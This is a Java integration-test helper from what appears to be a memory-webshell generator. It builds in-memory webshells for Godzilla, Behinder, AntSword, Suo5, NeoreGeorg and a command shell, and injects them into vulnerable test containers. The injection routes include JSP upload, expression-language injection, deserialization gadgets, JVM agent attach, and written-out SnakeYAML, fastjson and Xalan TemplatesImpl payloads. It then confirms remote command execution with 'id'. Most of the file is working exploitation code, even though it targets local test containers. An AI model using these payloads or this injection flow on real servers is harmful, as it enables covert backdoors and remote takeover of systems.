package com.reajason.javaweb.integration;

import com.reajason.javaweb.antsword.AntSwordManager;
import com.reajason.javaweb.behinder.BehinderManager;
import com.reajason.javaweb.godzilla.BlockingJavaWebSocketClient;
import com.reajason.javaweb.godzilla.GodzillaManager;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.*;
import com.reajason.javaweb.packer.JarPacker;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.jar.*;
import com.reajason.javaweb.packer.translet.XalanAbstractTransletPacker;
import com.reajason.javaweb.suo5.Suo5Manager;
import com.reajason.javaweb.utils.CommonUtil;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import net.bytebuddy.jar.asm.Opcodes;
import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.apache.commons.io.FileUtils;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.tuple.Pair;
import org.hamcrest.Matchers;
import org.testcontainers.containers.Container;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.utility.MountableFile;

import java.io.IOException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Objects;
import java.util.Random;

import static com.reajason.javaweb.memshell.ShellTool.*;
import static com.reajason.javaweb.utils.CommonUtil.INJECTOR_CLASS_NAMES;
import static com.reajason.javaweb.utils.CommonUtil.getRandomString;
import static org.hamcrest.CoreMatchers.anyOf;
import static org.hamcrest.CoreMatchers.containsString;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * @author ReaJason
 * @since 2024/12/5
 */
@Slf4j
public class ShellAssertion {

    public static void shellInjectIsOk(String url, String server, String shellType, String shellTool, int targetJdkVersion, Packers packer) {
        shellInjectIsOk(url, server, shellType, shellTool, targetJdkVersion, packer, null);
    }

    @SneakyThrows
    public static void shellInjectIsOk(String url, String server, String shellType, String shellTool, int targetJdkVersion, Packers packer, GenericContainer<?> container) {
        shellInjectIsOk(url, server, shellType, shellTool, targetJdkVersion, packer, container, null);
    }

    @SneakyThrows
    public static Pair<String, String> getUrls(String url, String shellType, String shellTool, Packers packer) {
        String shellUrl = url + "/test";
        String urlPattern = null;
        if (shellType.endsWith(ShellType.SERVLET)
                || shellType.endsWith(ShellType.SPRING_WEBMVC_CONTROLLER_HANDLER)
                || shellType.equals(ShellType.SPRING_WEBFLUX_HANDLER_METHOD)
                || shellType.equals(ShellType.SPRING_WEBFLUX_HANDLER_FUNCTION)
        ) {
            urlPattern = "/" + shellTool + shellType + packer.name();
            shellUrl = url + urlPattern;
        }

        if (shellType.endsWith(ShellType.WEBSOCKET)) {
            urlPattern = "/" + shellTool + shellType + packer.name();
            URL url1 = new URL(url);
            shellUrl = "ws://" + url1.getHost() + ":" + url1.getPort() + url1.getPath() + urlPattern;
        }
        return Pair.of(shellUrl, urlPattern);
    }

    @SneakyThrows
    public static void shellInjectIsOk(String url, String server, String shellType, String shellTool, int targetJdkVersion, Packers packer, GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
        shellInjectIsOk(url, server, null, shellType, shellTool, targetJdkVersion, packer, appContainer, pythonContainer);
    }

    @SneakyThrows
    public static void shellInjectIsOk(String url, String server, String serverVersion, String shellType, String shellTool,
                                       int targetJdkVersion, Packers packer,
                                       GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
        Pair<String, String> urls = getUrls(url, shellType, shellTool, packer);
        String shellUrl = urls.getLeft();
        String urlPattern = urls.getRight();

        ShellToolConfig shellToolConfig = getShellToolConfig(shellType, shellTool, packer);

        MemShellResult generateResult = generate(urlPattern, server, serverVersion, shellType, shellTool, targetJdkVersion, shellToolConfig, packer);

        packerResultAndInject(generateResult, url, shellTool, shellType, packer, appContainer);

        assertShellIsOk(generateResult, shellUrl, shellTool, shellType, appContainer, pythonContainer);
    }

    @SneakyThrows
    public static void packerResultAndInject(MemShellResult generateResult, String url, String shellTool, String shellType, Packers packer, GenericContainer<?> appContainer) {
        String content = null;
        if (packer.getInstance() instanceof AgentJarPacker ||
                packer.getInstance() instanceof AgentJarWithJREAttacherPacker ||
                packer.getInstance() instanceof AgentJarWithJDKAttacherPacker) {
            injectAgentJar(generateResult, shellTool, shellType, packer, appContainer);
            return;
        }
        if (packer.getInstance() instanceof ScriptEngineJarPacker) {
            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
            Path tempJar = Files.createTempFile("temp", "jar");
            Files.write(tempJar, bytes);
            String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
            appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
            FileUtils.deleteQuietly(tempJar.toFile());
            content = "!!javax.script.ScriptEngineManager [\n" +
                    "  !!java.net.URLClassLoader [[\n" +
                    "    !!java.net.URL [\"file://" + jarPath + "\"]\n" +
                    "  ]]\n" +
                    "]";
        } else if (packer.getInstance() instanceof GroovyTransformJarPacker) {
            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
            Path tempJar = Files.createTempFile("temp", "jar");
            Files.write(tempJar, bytes);
            String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
            appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
            FileUtils.deleteQuietly(tempJar.toFile());
            VulTool.postIsOk(url + "/fastjson", """
                    {
                      "@type":"java.lang.Exception",
                      "@type":"org.codehaus.groovy.control.CompilationFailedException",
                      "unit":{
                      }
                    }""");
            content = "{\n" +
                    "  \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                    "  \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                    "  \"config\":{\n" +
                    "    \"@type\": \"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                    "    \"classpathList\":\"file://" + jarPath + "\"\n" +
                    "  }\n" +
                    "}";
        } else if (packer.getInstance() instanceof XalanAbstractTransletPacker) {
            String bytes = packer.getInstance().pack(generateResult.toClassPackerConfig());
            content = "[\"org.apache.xalan.xsltc.trax.TemplatesImpl\",{\"transletName\":\"businessObject\",\"transletBytecodes\":[\"" + bytes + "\"],\"outputProperties\":{}}]";
        } else {
            content = packer.getInstance().pack(generateResult.toClassPackerConfig());
        }
        injectIsOk(url, shellType, shellTool, content, packer, appContainer);
        log.info("send inject payload successfully");
    }

    private static void injectAgentJar(MemShellResult generateResult, String shellTool, String shellType, Packers packer, GenericContainer<?> appContainer) throws IOException, InterruptedException {
        if (packer.getInstance() instanceof AgentJarPacker) {
            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
            Path tempJar = Files.createTempFile("temp", "jar");
            Files.write(tempJar, bytes);
            String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
            appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
            FileUtils.deleteQuietly(tempJar.toFile());
            String pidInContainer = appContainer.execInContainer("bash", "/fetch_pid.sh").getStdout().trim();
            assertDoesNotThrow(() -> Long.parseLong(pidInContainer));
            String stdout = appContainer.execInContainer("/jattach", pidInContainer, "load", "instrument", "false", jarPath).getStdout();
            log.info("attach result: {}", stdout);
            assertThat(stdout, anyOf(
                    containsString("ATTACH_ACK"),
                    containsString("JVM response code = 0")
            ));
        } else if (packer.getInstance() instanceof AgentJarWithJREAttacherPacker || packer.getInstance() instanceof AgentJarWithJDKAttacherPacker) {
            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
            Path tempJar = Files.createTempFile("temp", "jar");
            Files.write(tempJar, bytes);
            String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
            appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
            FileUtils.deleteQuietly(tempJar.toFile());
            String pidInContainer = appContainer.execInContainer("bash", "/fetch_pid.sh").getStdout();
            assertDoesNotThrow(() -> Long.parseLong(pidInContainer));
            Container.ExecResult execResult = appContainer.execInContainer("java", "-jar", jarPath, pidInContainer);
            String stdout = execResult.getStdout();
            if (stdout.contains("executable file not found")) {
                execResult = appContainer.execInContainer("/opt/IBM/WebSphere/AppServer/java/bin/java", "-jar", jarPath, pidInContainer);
            }
            stdout = execResult.getStdout();
            System.out.println(stdout);
            System.out.println(execResult.getStderr());
            log.info("attach result: {}", stdout);
            assertThat(stdout, anyOf(
                    containsString("ok")
            ));
        }
    }


    @SneakyThrows
    public static void assertShellIsOk(MemShellResult generateResult, String shellUrl, String shellTool, String shellType, GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
        switch (shellTool) {
            case Godzilla:
                godzillaIsOk(shellUrl, ((GodzillaConfig) generateResult.getShellToolConfig()));
                break;
            case Command:
                String paramName = ((CommandConfig) generateResult.getShellToolConfig()).getParamName();
                if (ShellType.UPGRADE.equals(shellType)) {
                    String shellClassName = generateResult.getShellClassName();
                    OkHttpClient okHttpClient = new OkHttpClient();
                    HttpUrl url = Objects.requireNonNull(HttpUrl.parse(shellUrl))
                            .newBuilder()
                            .addQueryParameter(paramName, "id")
                            .build();
                    Request request = new Request.Builder()
                            .header("Connection", "Upgrade")
                            .header("Upgrade", shellClassName)
                            .url(url)
                            .get().build();
                    try (Response response = okHttpClient.newCall(request).execute()) {
                        String res = response.body().string();
                        System.out.println(res.trim());
                        assertTrue(res.contains("uid="));
                    }
                } else {
                    commandIsOk(shellUrl, shellType, paramName, "id");
                }
                break;
            case Behinder:
                behinderIsOk(shellUrl, ((BehinderConfig) generateResult.getShellToolConfig()));
                break;
            case Suo5:
                suo5IsOk(shellUrl, ((Suo5Config) generateResult.getShellToolConfig()));
                break;
            case AntSword:
                antSwordIsOk(shellUrl, ((AntSwordConfig) generateResult.getShellToolConfig()));
                break;
            case NeoreGeorg:
                neoreGeorgIsOk(appContainer, pythonContainer, shellUrl, ((NeoreGeorgConfig) generateResult.getShellToolConfig()));
                break;
        }
    }

    private static void neoreGeorgIsOk(GenericContainer<?> container, GenericContainer<?> pythonContainer, String shellUrl, NeoreGeorgConfig shellToolConfig) throws Exception {
        URL url = new URL(shellUrl);
        shellUrl = "http://app:" + container.getExposedPorts().stream().findFirst().get() + url.getPath();
        String stdout = pythonContainer.execInContainer("python", "/app/neoreg.py", "-k", "key", "-H", shellToolConfig.getHeaderName() + ": " + shellUrl + "?" + shellToolConfig.getHeaderValue(), "-u", shellUrl).getStdout();
        log.info(stdout);
        assertTrue(stdout.contains("All seems fine"));
    }

    public static void godzillaIsOk(String entrypoint, GodzillaConfig shellConfig) {
        try (GodzillaManager godzillaManager = GodzillaManager.builder()
                .entrypoint(entrypoint).pass(shellConfig.getPass())
                .key(shellConfig.getKey()).header(shellConfig.getHeaderName()
                        , shellConfig.getHeaderValue()).build()) {
            assertTrue(godzillaManager.start());
            assertTrue(godzillaManager.test());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @SneakyThrows
    public static void commandIsOk(String entrypoint, String shellType, String paramName, String payload) {
        if (shellType.endsWith(ShellType.WEBSOCKET)) {
            webSocketCommandIsOk(entrypoint, payload);
            return;
        }
        OkHttpClient okHttpClient = new OkHttpClient();
        HttpUrl url = Objects.requireNonNull(HttpUrl.parse(entrypoint))
                .newBuilder()
                .addQueryParameter(paramName, payload)
                .build();
        Request request = new Request.Builder()
                .url(url)
                .get().build();

        try (Response response = okHttpClient.newCall(request).execute()) {
            String res = response.body().string();
            System.out.println(res.trim());
            assertTrue(res.contains("uid="));
        }
    }

    @SneakyThrows
    public static void webSocketCommandIsOk(String entrypoint, String payload) {
        String response = BlockingJavaWebSocketClient.sendRequestWaitResponse(entrypoint, payload);
        assertTrue(response.contains("uid="));
    }

    public static void behinderIsOk(String entrypoint, BehinderConfig shellConfig) {
        BehinderManager behinderManager = BehinderManager.builder()
                .entrypoint(entrypoint).pass(shellConfig.getPass())
                .header(shellConfig.getHeaderName()
                        , shellConfig.getHeaderValue()).build();
        assertTrue(behinderManager.test());
    }

    public static void suo5IsOk(String entrypoint, Suo5Config shellConfig) {
        assertTrue(Suo5Manager.test(entrypoint, shellConfig.getHeaderValue()));
    }

    public static void antSwordIsOk(String entrypoint, AntSwordConfig shellConfig) {
        AntSwordManager antSwordManager = AntSwordManager.builder()
                .entrypoint(entrypoint)
                .pass(shellConfig.getPass())
                .header(shellConfig.getHeaderName(), shellConfig.getHeaderValue())
                .build();
        assertTrue(antSwordManager.getInfo().contains("ok"));
    }

    public static ShellToolConfig getShellToolConfig(String shellType, String shellTool, Packers packer) {
        ShellToolConfig shellToolConfig = null;
        String uniqueName = shellTool + RandomStringUtils.randomAlphabetic(5) + shellType + RandomStringUtils.randomAlphabetic(5) + packer.name();
        switch (shellTool) {
            case Godzilla:
                String godzillaPass = "pass";
                String godzillaKey = "key";
                shellToolConfig = GodzillaConfig.builder()
                        .pass(godzillaPass).key(godzillaKey)
                        .headerName("User-Agent").headerValue(uniqueName)
                        .build();
                log.info("generated {} godzilla with pass: {}, key: {}, User-Agent: {}", shellType, godzillaPass, godzillaKey, uniqueName);
                break;
            case Command:
                shellToolConfig = CommandConfig.builder()
                        .paramName(uniqueName)
                        .build();
                log.info("generated {} command shell with paramName: {}", shellType, uniqueName);
                break;
            case Behinder:
                String behinderPass = "pass";
                shellToolConfig = BehinderConfig.builder()
                        .pass(behinderPass)
                        .headerName("User-Agent")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} behinder with pass: {}, User-Agent: {}", shellType, behinderPass, uniqueName);
                break;
            case Suo5:
                shellToolConfig = Suo5Config.builder()
                        .headerName("User-Agent")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} suo5 with User-Agent: {}", shellType, uniqueName);
                break;
            case AntSword:
                String antPassword = "ant";
                shellToolConfig = AntSwordConfig.builder()
                        .pass(antPassword)
                        .headerName("User-Agent")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} antSword with pass: {}, User-Agent: {}", shellType, antPassword, uniqueName);
                break;
            case NeoreGeorg:
                shellToolConfig = NeoreGeorgConfig.builder()
                        .headerName("Referer")
                        .headerValue(uniqueName)
                        .build();
                log.info("generated {} NeoreGeorg with Referer: {}", shellType, uniqueName);
                break;
        }
        return shellToolConfig;
    }

    public static MemShellResult generate(String urlPattern, String server, String serverVersin, String shellType, String shellTool, int targetJdkVersion, ShellToolConfig shellToolConfig, Packers packer) {
        InjectorConfig injectorConfig = InjectorConfig.builder().staticInitialize(true).build();
        if (StringUtils.isNotBlank(urlPattern)) {
            injectorConfig.setUrlPattern(urlPattern);
        }
        if (Packers.SpELSpringGzipJDK17.equals(packer)
                || Packers.OGNLSpringGzipJDK17.equals(packer)
                || Packers.JXPathSpringGzipJDK17.equals(packer)) {
            injectorConfig.setInjectorClassName("org.springframework.expression." + INJECTOR_CLASS_NAMES[new Random().nextInt(INJECTOR_CLASS_NAMES.length)] + getRandomString(5));
        }

        ShellConfig shellConfig = ShellConfig.builder()
                .server(server)
                .serverVersion(serverVersin)
                .shellTool(shellTool)
                .shellType(shellType)
                .targetJreVersion(targetJdkVersion)
                .byPassJavaModule(targetJdkVersion >= Opcodes.V9)
                .debug(true)
                .shrink(true)
                .build();
        return MemShellGenerator.generate(shellConfig, injectorConfig, shellToolConfig);
    }

    public static void injectIsOk(String url, String shellType, String shellTool, String content, Packers packer, GenericContainer<?> container) {
        switch (packer) {
            case JSP, ClassLoaderJSP, DefineClassJSP -> {
                String uploadEntry = url + "/upload";
                String filename = shellType + shellTool + packer + ".jsp";
                String shellUrl = url + "/" + filename;
                VulTool.uploadJspFileToServer(uploadEntry, filename, content);
                VulTool.urlIsOk(shellUrl);
            }
            case JSPX -> {
                String uploadEntry = url + "/upload";
                String filename = shellType + shellTool + ".jspx";
                String shellUrl = url + "/" + filename;
                VulTool.uploadJspFileToServer(uploadEntry, filename, content);
                VulTool.urlIsOk(shellUrl);
            }
            case ScriptEngine, DefaultScriptEngine, ScriptEngineNoSquareBrackets, ScriptEngineBigInteger ->
                    VulTool.postIsOk(url + "/js", content);
            case EL -> VulTool.postIsOk(url + "/el", content);
            case SpEL, SpELSpringGzip, SpELScriptEngine, SpELSpringGzipJDK17 ->
                    VulTool.postIsOk(url + "/spel", content);
            case OGNLSpringGzip, OGNLScriptEngine, OGNLSpringGzipJDK17 -> VulTool.postIsOk(url + "/ognl", content);
            case MVEL -> VulTool.postIsOk(url + "/mvel", content);
            case JXPath, JXPathScriptEngine, JXPathSpringGzip, JXPathSpringGzipJDK17 ->
                    VulTool.postIsOk(url + "/jxpath", content);
            case JEXL -> VulTool.postIsOk(url + "/jexl2", content);
            case Aviator -> VulTool.postIsOk(url + "/aviator", content);
            case Groovy -> VulTool.postIsOk(url + "/groovy", content);
            case Rhino -> VulTool.postIsOk(url + "/rhino", content);
            case BeanShell -> VulTool.postIsOk(url + "/bsh", content);
            case JinJava -> VulTool.postIsOk(url + "/jinjava", content);
            case Freemarker -> VulTool.postIsOk(url + "/freemarker", content);
            case Velocity -> VulTool.postIsOk(url + "/velocity", content);
            case JavaDeserialize -> VulTool.postIsOk(url + "/java_deserialize", content);
            case JavaCommonsBeanutils16 -> VulTool.postIsOk(url + "/java_deserialize/cb161", content);
            case JavaCommonsBeanutils17 -> VulTool.postIsOk(url + "/java_deserialize/cb170", content);
            case JavaCommonsBeanutils18 -> VulTool.postIsOk(url + "/java_deserialize/cb183", content);
            case JavaCommonsBeanutils19 -> VulTool.postIsOk(url + "/java_deserialize/cb194", content);
            case JavaCommonsBeanutils110 -> VulTool.postIsOk(url + "/java_deserialize/cb110", content);
            case JavaCommonsCollections3 -> VulTool.postIsOk(url + "/java_deserialize/cc321", content);
            case JavaCommonsCollections4 -> VulTool.postIsOk(url + "/java_deserialize/cc40", content);
            case HessianDeserialize -> VulTool.postIsOk(url + "/hessian", content);
            case Hessian2Deserialize -> VulTool.postIsOk(url + "/hessian2", content);
            case ScriptEngineJar -> VulTool.postIsOk(url + "/snakeYaml", content);
            case GroovyTransformJar -> VulTool.postIsOk(url + "/fastjson", content);
            case XMLDecoderScriptEngine, XMLDecoderDefineClass -> VulTool.postIsOk(url + "/xmlDecoder", content);
            case Base64 -> VulTool.postIsOk(url + "/b64", content);
            case BigInteger -> VulTool.postIsOk(url + "/biginteger", content);
            case XxlJob -> VulTool.xxlJobExecutor(url + "/run", content);
            case H2, H2JS, H2Javac, H2JSURLEncode -> VulTool.postIsOk(url + "/jdbc", content);
            case XalanAbstractTransletPacker -> VulTool.postIsOk(url + "/jackson", content);
            default -> throw new IllegalStateException("Unexpected value: " + packer);
        }
    }

    public static void testProbeInject(String url, String server, String serverVersion, String shellType, int targetJdkVersion) {
        String shellTool = ShellTool.Command;
        Packers packer = Packers.BigInteger;
        Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
        String shellUrl = urls.getLeft();
        String urlPattern = urls.getRight();
        if (urlPattern != null) {
            shellUrl += "testProbe";
            urlPattern += "testProbe";
        }
        ShellConfig shellConfig = ShellConfig.builder()
                .server(server)
                .serverVersion(serverVersion)
                .shellType(shellType)
                .shellTool(shellTool)
                .targetJreVersion(targetJdkVersion)
                .debug(false)
                .probe(true)
                .build();
        InjectorConfig injectorConfig = InjectorConfig.builder()
                .urlPattern(urlPattern)
                .staticInitialize(true)
                .build();
        String paramName = "tomcatProbe" + shellType;
        CommandConfig commandConfig = CommandConfig.builder()
                .paramName(paramName)
                .build();
        MemShellResult generateResult = MemShellGenerator.generate(shellConfig, injectorConfig, commandConfig);
        String content = packer.getInstance().pack(generateResult.toClassPackerConfig());
        String res = VulTool.postIsOk(url + "/biginteger", content);
        assertThat(res, anyOf(
                Matchers.containsString("context: "),
                Matchers.containsString("server: "),
                Matchers.containsString("channel: ")

        ));
        ShellAssertion.commandIsOk(shellUrl, shellType, paramName, "id");
    }

    public static void testProbeInject(String url, String server, String shellType, int targetJdkVersion) {
        testProbeInject(url, server, null, shellType, targetJdkVersion);
    }
}
